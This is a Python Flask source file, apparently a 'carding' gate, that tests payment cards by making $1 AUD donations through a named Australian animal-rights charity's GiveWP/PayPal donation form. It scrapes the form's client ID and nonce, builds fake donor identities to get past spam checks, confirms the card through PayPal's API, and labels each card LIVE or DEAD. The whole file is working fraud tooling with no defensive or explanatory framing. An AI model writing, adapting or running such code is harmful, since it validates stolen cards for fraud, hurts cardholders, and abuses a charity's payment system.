# Dev : @xoxhunterxd
import requests
import re
import base64
import json
import traceback
import random
import string
from flask import Flask, request, jsonify

app = Flask(__name__)

def get_real_identity():
    """Fetches a high-quality identity from a public API to avoid SPAM flags."""
    try:
        # Requesting AU/US identities to match the site's AUD currency
        res = requests.get('https://randomuser.me/api/?nat=au,us', timeout=5)
        user_data = res.json()['results'][0]
        return {
            "first": user_data['name']['first'].capitalize(),
            "last": user_data['name']['last'].capitalize(),
            "email": user_data['email']
        }
    except:
        # Fallback local generation
        prefix = ''.join(random.choices(string.ascii_lowercase, k=10))
        return {"first": "James", "last": "Smith", "email": f"{prefix}@mail.in"}

@app.route('/check', methods=['GET'])
def check_card():
    cc_param = request.args.get('cc')
    if not cc_param or cc_param.count('|') != 3:
        return jsonify({"status": "DEAD", "msg": "INVALID_FORMAT", "dev": "@xoxhunterxd"})

    try:
        # Input parsing
        number, month, year_short, cvv = cc_param.split('|')
        month = month.zfill(2)
        year_full = f"20{year_short[-2:]}"
        
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36'
        })

        # 1. Scrape Configuration (Ported from checker.js)
        init_html = session.get('https://animalrights.org.au/donate-now/').text
        form_url = re.search(r"data-form-view-url=['\"]([^'\"]+)['\"]", init_html).group(1).replace('&#038;', '&')
        form_html = session.get(form_url).text
        
        # Regex extraction to handle JS objects
        client_id = re.search(r'["\']clientId["\']\s*:\s*["\']([^"\']+)["\']', form_html).group(1)
        form_id = re.search(r'["\']donationFormId["\']\s*:\s*(\d+)', form_html).group(1)
        nonce = re.search(r'["\']donationFormNonce["\']\s*:\s*["\']([^"\']+)["\']', form_html).group(1)
        donate_url = re.search(r'["\']donateUrl["\']\s*:\s*["\']([^"\']+)["\']', form_html).group(1)

        # 2. PayPal Token
        auth = base64.b64encode(f"{client_id}:".encode()).decode()
        token_res = session.post('https://www.paypal.com/v1/oauth2/token',
                                 headers={'Authorization': f'Basic {auth}'},
                                 data='grant_type=client_credentials').json()
        access_token = token_res.get('access_token')

        # 3. Create Order via Site AJAX
        id_data = get_real_identity()
        ajax_payload = {
            'action': 'give_paypal_commerce_create_order',
            'give-form-id': form_id,
            'give-form-hash': nonce,
            'give_payment_mode': 'paypal-commerce',
            'give-amount': '1',
            'give_first': id_data['first'],
            'give_last': id_data['last'],
            'give_email': id_data['email'],
            'give-cs-form-currency': 'AUD',
        }
        order_res = session.post('https://animalrights.org.au/wp-admin/admin-ajax.php', data=ajax_payload).json()
        order_id = order_res['data']['id']

        # 4. Confirm Card (State Transition)
        confirm_res = session.post(
            f"https://www.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
            headers={'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json'},
            json={"payment_source": {"card": {"number": number, "security_code": cvv, "expiry": f"{year_full}-{month}"}}}
        ).json()

        # 5. Final Execution (The "Full" part from checker.js)
        if confirm_res.get('status') == 'APPROVED':
            # Extract routing parameters for the final hit
            route_params = dict(re.findall(r'([^?&]+)=([^&]+)', donate_url.replace('&#038;', '&')))
            
            final_form = {
                'amount': '1', 'currency': 'AUD', 'donationType': 'single',
                'formId': form_id, 'gatewayId': 'paypal-commerce',
                'firstName': id_data['first'], 'lastName': id_data['last'], 'email': id_data['email'],
                'anonymous': 'false', 'isEmbed': 'true', 'locale': 'en_AU',
                'gatewayData[payPalOrderId]': order_id,
                'originUrl': 'https://animalrights.org.au/donate-now/',
            }
            
            final_res = session.post('https://animalrights.org.au/', params={
                'givewp-route': 'donate',
                'givewp-route-signature': route_params.get('givewp-route-signature'),
                'givewp-route-signature-id': route_params.get('givewp-route-signature-id'),
                'givewp-route-signature-expiration': route_params.get('givewp-route-signature-expiration'),
            }, data=final_form)

            # Determine Live status based on site success
            status = "LIVE" if '"success":true' in final_res.text.lower() else "DEAD"
            return jsonify({
                "status": status,
                "card": cc_param,
                "msg": "Approved" if status == "LIVE" else "Site_Security_Declined",
                "dev": "@xoxhunterxd",
                "full_info": id_data,
                "raw_site_resp": final_res.text[:300]
            })
        else:
            # Decline details from PayPal
            error_msg = confirm_res.get('details', [{}])[0].get('issue', 'DECLINED')
            return jsonify({"status": "DEAD", "card": cc_param, "msg": error_msg, "dev": "@xoxhunterxd"})

    except Exception as e:
        return jsonify({"status": "DEAD", "msg": "GATE_ERROR", "error": str(e), "dev": "@xoxhunterxd"}), 200

application = app
